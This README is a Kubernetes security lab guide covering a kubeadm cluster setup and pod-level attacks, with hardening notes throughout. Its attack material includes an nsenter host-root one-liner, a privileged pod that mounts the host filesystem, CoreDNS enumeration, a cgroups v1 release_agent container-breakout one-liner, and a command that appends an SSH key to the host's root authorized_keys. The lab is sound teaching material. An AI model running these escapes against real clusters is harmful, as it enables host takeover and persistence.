## DevSecOps Kubernetes Playground ("A Hacker's Guide to Kubernetes")

### Based on [Cloud-Native & Kubernetes Security HOWTO](./README-DevSecOps-k8s-general.md)

### Tech Stack: Proxmox/pfSense/Ansible/Packer/Terraform/Kubernetes: kubeadm-based & KIND/Docker/etc.

### Prerequisite: 

#### [(DEFAULT DevSecOps ENV) Pentest Infrastructure/Environment (On-Prem Kubernetes Cluster)](./README-setup-environment.md): 

Kubernetes kubeadm-based setup with terraform + ansible on ProxMox (pfSense VM as Firewall/VPN/LB + k8s nodes VMs)
Production-like On-Prem Kubernetes cluster.

#### [(OPTIONAL DevSecOps ENV) Pentest KIND local environment (laptop)](./K8S/KIND/README.md).

Kind (Kubernetes IN Docker) https://kind.sigs.k8s.io : It runs
Kubernetes clusters in Docker containers. It supports multi-node
clusters as well as HA Clusters (High-Availability). KIND or kubernetes in docker is a suite of tooling for local Kubernetes “clusters” where each "node" is a Docker container. KIND is targeted at testing Kubernetes. It is a new project that aims to bring dockerized K3s. 
So we will use KIND to build k8s "cluster" on local development environment. KIND also suport differnt CNI:Calico, Culium, etc., so we also can test Network policies locally.

Note: We can also setup managed-k8s private clusters for this DevSecOps playground 

- [Amazon EKS private clusters](https://docs.aws.amazon.com/eks/latest/userguide/private-clusters.html)
- [Azure AKS private clusters](https://docs.microsoft.com/en-us/azure/aks/private-clusters)
- [Google GKE private clusters](https://cloud.google.com/kubernetes-engine/docs/concepts/private-cluster-concept#network_peering_reuse)


### Objective: Kubernetes has historically not been security hardened out of the box! 
Default kubeadm-based k8s installation for this playground for example is not secured.

- no PSP (PodSecurityPolicy Deprecation)
- no Network Policies (flat pod network topology for easy pod-to-pod comunication without restrictions)
- etc., etc.

Note PSP : The Pod Security Standards (PSS) were developed to replace the Pod Security Policy (PSP). As of Kubernetes version 1.21, PodSecurityPolicy (beta) is deprecated. The Kubernetes project aims to shut the feature down in version 1.25 -> Ref: (K8S) https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/ && (GCP GKE) https://cloud.google.com/kubernetes-engine/docs/deprecations/podsecuritypolicy && (Azure AKS) https://docs.microsoft.com/en-us/azure/aks/use-pod-security-policies && (AWS EKS) https://docs.aws.amazon.com/eks/latest/userguide/pod-security-policy.html. Alternatives for on-prem (private clouds/datacenter:bare-metal) are Open Policy Agent (OPA) & Kyverno, but implementation/setup/configuration difficult is difficult (but needed for better k8s security). Cloud managed-k8s PSS are easy for setup.

### As a bare minimum enable RBAC, PSP and use Network Policies 
RBAC is enabled for default installation, but PSP is not (because of k8s refactoing to support Pod Security Standats) and also we need to implement some Network Policies:

- RBAC: --authorization-mode=Node,RBAC
- Always use Pod securityContext! (securityContext: ... )
- PSP: --enable-admission-plugins=NodeRestriction,PodSecurityPolicy (Use Pod securityContext, if PSP is not enabled or not possible to be implemented!-> https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/)
- Network Policies: Use Cilium or Calico CNI with base k8s Kubernetes Network Policy API and Cilium and Calico Network Policy Extensions.

Note: Network Policies working only with some CNI (Calico or Cilium) and these CNI(Calico or Cilium) has Network Policy Extensions.
Cilium and Calico Network Policy Extensions: In addition to the base functionality provided 
by the Kubernetes Network Policy API, there are also additional capabilities provided by some CNI providers.
These extensions often make scaling network policies and making consistent
network policies across larger clusters easier. The trade-off with using them is
that the objects used to manage them will be tied to the CNI provider choice,
and if you want to have flexibility to use other CNI providers, you’ll need to
look at re-implementing the restrictions on each CNI provider you implement.
Two of these providers are Cilium and Calico.

Example (Default installation): 
```
$ ssh root@10.0.200.18

RBAC: --authorization-mode=Node,RBAC
PSP is not enabled, to enable it add: --enable-admission-plugins=NodeRestriction,PodSecurityPolicy
Network Policies are not setuped: Use Cilium or Calico CNI with base k8s Kubernetes Network Policy API and Cilium and Calico Network Policy Extensions.

root@kmaster0:/etc/kubernetes/manifests# cat kube-apiserver.yaml

...
spec:
  containers:
  - command:
    - kube-apiserver
    - --advertise-address=10.0.200.18
    - --allow-privileged=true
    - --authorization-mode=Node,RBAC
    - --client-ca-file=/etc/kubernetes/pki/ca.crt
    - --enable-admission-plugins=NodeRestriction
    - --enable-bootstrap-token-auth=true
    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
    - --etcd-servers=https://127.0.0.1:2379
    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt
    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key
    - --requestheader-allowed-names=front-proxy-client
    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt
    - --requestheader-extra-headers-prefix=X-Remote-Extra-
    - --requestheader-group-headers=X-Remote-Group
    - --requestheader-username-headers=X-Remote-User
    - --secure-port=443
    - --service-account-issuer=https://kubernetes.default.svc.cluster.local
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
    - --service-cluster-ip-range=172.21.0.0/16
    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
...

```

Kubernetes data flow diagram (trust boundaries):

<img src="pictures/trustboundaries.png?raw=true" width="800">


### Setup Pentest laptop (docker to build/push some image to JFfrog docker registry)

Note: [Install ansible, packer, terraform, kubectl, helm, etc.: setup_laptop_ubuntu.sh](./utils/setup_laptop_ubuntu.sh)

```
### Check JFrog Docker Registry (from laptop and k8s nodes)

davar@carbon:$ nc -z -v  10.0.200.8  8082
Connection to 10.0.200.8 8082 port [tcp/*] succeeded!

root@carbon:/etc/docker# cat daemon.json
{
    "insecure-registries" : ["10.0.200.8:8082"]
}
root@carbon:/etc/docker# systemctl restart docker
root@carbon:/etc/docker# docker login https://10.0.200.8:8082
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

### DevSecOps K8S Playground:

### 1.Pod-Level Hacking

#### 1.1. Privileged Pod Examples

- Example1: nsenter example
```

- Run the nsenter one-liner.
- Check for root in the process namespace.
- Check for kernel PIDs to verify we’re in
the root namespace.

$ kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID":true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}'
If you don't see a command prompt, try pressing enter.

root@r00t:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@r00t:/# ps -auxf


The form nsenter --all --target ${TARGET_PID} is used for entering all of a process’s namespaces, similar to docker
exec. This is different from volumes mounted from
the host.

```
- Example2: Using alpine-containertools  

```
### create docker repo in jfrog via jfrog UI (alpine-containertools)

$ cd DevSecOps-K8S/alpine-containertools
$ docker build -t 10.0.200.8:8082/alpine-containertools/alpine-containertools .
$ docker push 10.0.200.8:8082/alpine-containertools/alpine-containertools 
...
The push refers to repository [10.0.200.8:8082/alpine-containertools/alpine-containertools]
latest: digest: sha256:0b2ad7e2471ab4f6aad0921a4641aa0171626237a896063cc399601d5f6d792d size: 6408

### Deploy 
$ cd DevSecOps-K8S/alpine-containertools/manifests
$ cat privpod.yml 
#Simple example of a privileged pod
apiVersion: v1
kind: Pod
metadata:
  name: privpod
  labels:
spec:
  containers:
  - name: privpod
    image: 10.0.200.8:8082/alpine-containertools/alpine-containertools
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /node
      name: noderoot
  imagePullSecrets:
  - name: regcred
  volumes:
  - name: noderoot
    hostPath:
      path: /

### Note: imagePullSecrets

$ kubectl apply -f ./privpod.yml

$ kubectl get po
NAME      READY   STATUS    RESTARTS   AGE
privpod   1/1     Running   0          18s
$ kubectl exec -it privpod -- bash
bash-5.1# ps -ef
PID   USER     TIME  COMMAND
    1 root      0:00 sshd: /usr/sbin/sshd -D -p 3456 -e [listener] 0 of 10-100 startups
   21 root      0:00 bash
   27 root      0:00 ps -ef

### 1.1.1.DNS enumeration/service discovery using kube-dns(CoreDNS) attack

The default Kubernetes CoreDNS installation
leaks information about its services, and
offers an attacker a view of all possible
network endpoints.

By default Kubernetes DNS servers provide
all records for services across the cluster,
preventing namespace segregation unless
deployed individually per-namespace or
domain.

Note: CoreDNS supports policy plug-ins, including
OPA, to restrict access to DNS records and
defeat the following enumeration attacks.

bash-5.1# cat /etc/resolv.conf 
search default.svc.cluster.local svc.cluster.local cluster.local 
nameserver 172.21.0.10
options ndots:5

DNS enumeration can be performed against a
default, unrestricted CoreDNS installation.
To retrieve all services in the cluster
namespace:


bash-5.1# dig +noall +answer srv any.any.any.svc.cluster.local |sort -k 8
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 443 10-0-200-18.kubernetes.default.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10257 10-0-200-18.prometheus-kube-prometheus-kube-controller-manager.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 2379 10-0-200-18.prometheus-kube-prometheus-kube-etcd.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10259 10-0-200-18.prometheus-kube-prometheus-kube-scheduler.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10250 10-0-200-18.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10255 10-0-200-18.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 4194 10-0-200-18.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9100 10-0-200-18.prometheus-prometheus-node-exporter.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10250 10-0-200-19.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10255 10-0-200-19.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 4194 10-0-200-19.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9100 10-0-200-19.prometheus-prometheus-node-exporter.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10250 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10255 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 4194 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9100 10-0-200-20.prometheus-prometheus-node-exporter.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 53 172-20-0-10.kube-dns.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9153 172-20-0-10.kube-dns.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9153 172-20-0-10.prometheus-kube-prometheus-coredns.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 8080 172-20-0-147.prometheus-kube-state-metrics.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 53 172-20-0-180.kube-dns.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9153 172-20-0-180.kube-dns.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9153 172-20-0-180.prometheus-kube-prometheus-coredns.kube-system.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9090 172-20-0-35.prometheus-kube-prometheus-prometheus.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 8443 172-20-0-43.nginx-ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 443 172-20-0-43.nginx-ingress-nginx-controller.ingress-nginx.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 80 172-20-0-43.nginx-ingress-nginx-controller.ingress-nginx.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 3000 172-20-0-57.prometheus-grafana.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 8443 172-20-2-26.nginx-ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 443 172-20-2-26.nginx-ingress-nginx-controller.ingress-nginx.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 80 172-20-2-26.nginx-ingress-nginx-controller.ingress-nginx.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 10250 172-20-2-34.prometheus-kube-prometheus-operator.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9093 172-20-2-45.prometheus-kube-prometheus-alertmanager.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 4443 172-20-2-51.metrics-server.metrics-server.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9093 alertmanager-prometheus-kube-prometheus-alertmanager-0.alertmanager-operated.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9094 alertmanager-prometheus-kube-prometheus-alertmanager-0.alertmanager-operated.prometheus.svc.cluster.local.
any.any.any.svc.cluster.local. 30 IN	SRV	0 2 9090 prometheus-prometheus-kube-prometheus-prometheus-0.prometheus-operated.prometheus.svc.cluster.local.

bash-5.1# dig +noall +answer 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local.
10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local. 30 IN A 10.0.200.20

### 1.1.2. Using env variables (checking k8s version example)
Kubernetes sets some useful environment
variables into each container in a pod
Note: Kubernetes Secrets should not be mounted as
environment variables.The safer option is to use a well-known path,
and mount a Secret tmpfs volume into the
container, so an adversary has to guess or find the Secret file path, which is less likely
to be automated by an attacker. Mounted
Secrets are updated automatically, after a
kubelet sync period and cache propagation
delay. Mounting Secrets as files protects against
information leakage and ensures adversaries
like attacker don’t stumble across production secrets when diving through
stolen application logs.

bash-5.1# env |grep -E '(KUBERNETES|[^_]SERVICE)_PORT=' | sort
KUBERNETES_PORT=tcp://172.21.0.1:443

bash-5.1# env | grep KUBE
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://172.21.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=172.21.0.1
KUBERNETES_SERVICE_HOST=172.21.0.1
KUBERNETES_PORT=tcp://172.21.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443

bash-5.1# curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
{
  "major": "1",
  "minor": "23",
  "gitVersion": "v1.23.8",
  "gitCommit": "a12b886b1da059e0190c54d09c5eab5219dd7acf",
  "gitTreeState": "clean",
  "buildDate": "2022-06-16T05:51:36Z",
  "goVersion": "go1.17.11",
  "compiler": "gc",
  "platform": "linux/amd64"
}bash-5.1# 


#### 1.1.3. Filesystem attacks

### The first thing attacker does is check to see what kind of container they’re in. Checking /proc/self/cgroup often gives a clue, and here they can see they’re in Kubernetes from the clue -> /kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice

bash-5.1# cat /proc/self/cgroup
12:pids:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
11:net_cls,net_prio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
10:devices:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
9:rdma:/
8:cpuset:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
7:freezer:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
6:memory:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
5:cpu,cpuacct:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
4:hugetlb:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
3:perf_event:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
2:blkio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
1:name=systemd:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-poda08b04cb_5641_42db_bad8_30bd1a20ec4a.slice/cri-containerd-2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686.scope
0::/system.slice/containerd.service

### Next, they might check for capabilities with their process’s status entry in /proc/self/status. The kernel freely provides this information in
order to help Linux applications, and an attacker in a container can use it to their advantage. Interesting entries can be grepped
out (notice we’re root below):

bash-5.1# grep -E  '(Uid|CoreDumping|Seccomp|NoNewPrivs|Cap[A-Za-z]+):' /proc/self/status
Uid:	0	0	0	0
CoreDumping:	0
CapInh:	0000003fffffffff
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0


### The capabilities are not very readable, and need to be decoded (using capsh -- decode=0000003fffffffff).You can also use the capsh --print
command to show capabilities (if it’s installed), getpcaps and filecap (for a single process or file, respectively), pscap (for all running processes), and captest (for the current process’s context).

Note: A production container should never contain
these debugging commands, instead only
containing production applications and code.
Using static, slim, or distroless containers
reduces the attack surface of a container by
limiting an attacker’s access to useful
information. This is also why you should limit
the availability of network-capable applications
like curl and wget where possible, as well as
any interpreters with network libraries that can
be used to pull external tools into a running
container.

Note: amicontained is installed in alpine-containertools image. Note: You may prefer to run Jess Frazelle’s
amicontained, which runs these checks
quickly and also handily detects capability,
seccomp, and LSM configuration.


$ kubectl exec -it privpod -- bash
bash-5.1# amicontained
Container Runtime: kube
Has Namespaces:
	pid: true
	user: false
AppArmor Profile: unconfined
Capabilities:
	BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
command terminated with exit code 129

Note: You may install amicontained insude some other Pod this way:

- Export the sha256sum for verification.
- Download and check the sha256sum.
- We installed to a non-standard path to
evade immutable filesystems, so we run a
fully-qualified path

bash-5.1# export AMICONTAINED_SHA256="d8c49e2cf44ee9668219acd092ed961fc1aa420a6e036e0822d7a31033776c9f"
bash-5.1# curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64" -o "/tmp/amicontained" && echo "${AMICONTAINED_SHA256} /tmp/amicontained" | sha256sum -c - && chmod a+x "/tmp/amicontained"

davar@carbon:~$ export AMICONTAINED_SHA256="d8c49e2cf44ee9668219acd092ed961fc1aa420a6e036e0822d7a31033776c9f"
davar@carbon:~$ curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64" -o "/tmp/amicontained" && echo "${AMICONTAINED_SHA256} /tmp/amicontained" | sha256sum -c - && chmod a+x "/tmp/amicontained"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
100 5936k  100 5936k    0     0  1648k      0  0:00:03  0:00:03 --:--:-- 5387k
/tmp/amicontained: OK
davar@carbon:~$ kubectl cp /tmp/amicontained default/privpod:/tmp/amicontained
$ kubectl exec -it privpod -- bash
bash-5.1# /tmp/amicontained
Container Runtime: kube
Has Namespaces:
	pid: true
	user: false
AppArmor Profile: unconfined
Capabilities:
	BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
command terminated with exit code 129

Jackpot! There’s a lot of information
available about the security configuration of a
container—from within it.



#### We can check our cgroup limits on the filesystem too: 
bash-5.1# free -m
              total        used        free      shared  buff/cache   available
Mem:           1978        1076          79          37         821         695
Swap:             0           0           0

free -m uses host-level APIs available to
all processes and has not been updated to run
with cgroups. Check the system API to see
the process’s actual cgroup limits:

bash-5.1# cat /sys/fs/cgroup/memory/memory.limit_in_bytes 
9223372036854771712

Is this tremendously useful to an attacker?
Not really. Exhausting the memory of a
process and causing denial of service is a
basic attack (although fork bombs are
elegantly scripted Bash poetry). Nevertheless,
you should set cgroups to prevent DoS of

applications in a container or pod (which
support individual configuration). Cgroups
are not a security boundary, and cgroups v1
can be escaped from a privileged pod, as
nicely demonstrated ---> Felix Wilhelm’s cleverly tweet-sized cgroups
v1 container breakout:

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o

Note: The more secure, and rootless-prerequisite,
cgroups v2 should be the default in most
Linux installations from 2022.


### Write into host filesystem example 
$ ls -lasp /dev/
$ mount /dev/xvda1 /mnt/
# write into host filesystem's /root/.ssh/ folder
$ cat MY_PUB_KEY >> /mnt/root/.ssh/authorized_keys


### 1.1.4. tmpfs attacks

A fastidious explorer leaves no sea uncharted,
and to attacker attacking the
filesystem is no different. Checking for
anything external added to the mount
namespace is the first port of call, for which
common tools like mount and df can be
used.

Note: Every external device, filesystem, socket, or
entity shared into a container increases a risk of
container breakout through exploit or
misconfiguration. Containers are at their most
secure when they contain only the bare
essentials for operation, and share nothing with
each other or the underlying host.


bash-5.1# mount |grep overlay
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/156/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/155/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/154/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/153/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/152/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/151/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/150/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/149/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/148/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/147/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/146/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/145/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/144/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/143/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/142/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/141/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/139/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/138/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/137/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/136/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/134/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/133/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/131/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/130/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/129/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/95/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/157/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/157/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/93c0b6c1bd9eedaa041d4f9aab98657137a5332ef9807f36dcb6d7511557090d/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/3/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/3/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/4b8209b689edf37111f69a31b4a525add26c8ffbf0b711ede80a566670f0fed5/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/b30c0352ea7035ae3f1c57973a5ad406bb9d5181f54b34c1d9bb2659fcbef494/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/11/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/10/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/9/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/8/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/5/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/15/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/15/work)
